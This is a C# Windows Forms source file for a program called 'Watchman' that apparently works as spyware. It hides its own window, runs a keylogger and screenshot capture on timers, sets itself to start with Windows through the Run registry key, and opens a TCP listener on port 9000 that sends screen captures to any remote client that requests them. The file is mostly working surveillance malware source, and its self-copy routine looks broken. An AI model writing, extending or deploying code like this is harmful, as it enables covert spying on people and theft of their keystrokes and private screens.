using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Watchman
{
    public partial class Form1 : Form
    {
        private static readonly Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static readonly List<Socket> ClientSockets = new List<Socket>();
        private static readonly byte[] Buffer = new byte[1024];
        private Camera _cam;
        private KLog _keylog;

        public Form1()
        {
            InitializeComponent();
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddress = null;
            foreach (IPAddress ip in ipHostInfo.AddressList)
            {
                if (ip.AddressFamily != AddressFamily.InterNetwork) continue;
                ipAddress = ip;
                break;
            }
            if (ipAddress != null)
            {
                IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 9000);
                ServerSocket.Bind(localEndPoint);
            }
            ServerSocket.Listen(1);
            ServerSocket.BeginAccept(AcceptCallback, null);
        }
        

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
            Opacity = 0;
            ShowInTaskbar = false;
            
            timer1.Enabled = true; 
            timer2.Enabled = true;
            timer3.Enabled = true;
            timer4.Enabled = true;

            _keylog = new KLog();
        }

        private void StartCam()
        {
            _cam = new Camera();
            _cam.Connect(pictureBox1, _cam.Devices[0]);
        }
        private void CopyApplication(string location)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            if (File.Exists(filePath)) File.Delete(filePath);
            File.Copy(filePath, location);
        }

        private void AddToStartUp()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp != null && rkApp.GetValue("WatchMan") == null)
                rkApp.SetValue("WatchMan", Application.ExecutablePath);
        }

        #region Time Tickers
        private void timer1_Tick(object sender, EventArgs e)
        {
            _keylog.Log();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            _keylog.ActiveWindow();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            _keylog.WriteLog();
            _keylog.TakeScreen();
        }
        #endregion

        #region Click events

        private void button1_Click(object sender, EventArgs e)
        {
            _cam.Record();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _cam.StopRecord();
        }

        #endregion

        #region Remote
        private static void AcceptCallback(IAsyncResult iar)
        {
            Socket socket = ServerSocket.EndAccept(iar);
            ClientSockets.Add(socket);
            socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReceiveCallback, socket);

            ServerSocket.BeginAccept(AcceptCallback, null);
        }

        private static void ReceiveCallback(IAsyncResult iar)
        {
            try
            {
                Socket socket = (Socket) iar.AsyncState;
                int received = socket.EndReceive(iar);
                byte[] dataBuffer = new byte[received];

                Array.Copy(Buffer, dataBuffer, received);
                string text = Encoding.ASCII.GetString(dataBuffer);

                byte[] data;
                switch (text.ToLower())
                {
                    case "screen capture":
                        {
                    
                            byte[] currentData = KLog.RemoteTakeScreen();
                            using (MemoryStream ms = new MemoryStream(new byte[currentData.Length + 4]))
                            {
                                byte[] size = BitConverter.GetBytes(currentData.Length);
                                ms.Write(size, 0, 4);
                                ms.Write(currentData, 0, currentData.Length);
                                data = ms.ToArray();
                                ms.Close();
                            }
                    
                        }
                        break;
                    case "get log":
                        data = Encoding.ASCII.GetBytes("Unknown request");
                        break;
                    default:
                        data = Encoding.ASCII.GetBytes("Unknown request");
                        break;
                }

                //Do your thing then
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, SendCallback, socket);
                
                socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReceiveCallback,
                                    socket);
            }
            catch (ObjectDisposedException e)
            {
                Console.WriteLine(e.Message);
            }
            catch (SocketException ex)
            {
                Console.WriteLine(ex.Message);
            }
            
        }

        private static void SendCallback(IAsyncResult iar)
        {
            Socket socket = (Socket) iar.AsyncState;
            socket.EndSend(iar);
        }
        #endregion
    }
}
